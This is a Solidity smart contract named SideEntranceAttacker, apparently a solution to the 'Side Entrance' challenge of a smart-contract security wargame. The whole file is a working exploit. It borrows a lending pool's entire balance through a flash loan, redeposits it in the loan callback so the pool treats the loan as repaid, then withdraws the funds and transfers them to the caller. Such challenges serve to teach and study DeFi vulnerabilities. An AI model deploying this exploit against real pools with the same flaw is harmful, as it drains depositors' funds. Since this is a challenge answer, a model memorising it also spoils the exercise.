// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
	function deposit() external payable;

	function withdraw() external;

	function flashLoan(uint256) external;
}

contract SideEntranceAttacker {
	function attack(address targetAddress) public {
		ISideEntranceLenderPool targetInterface = ISideEntranceLenderPool(targetAddress);
		targetInterface.flashLoan(targetAddress.balance);
		targetInterface.withdraw();
		payable(msg.sender).transfer(address(this).balance);
	}

	function execute() external payable {
		ISideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
	}

	receive() external payable {}
}
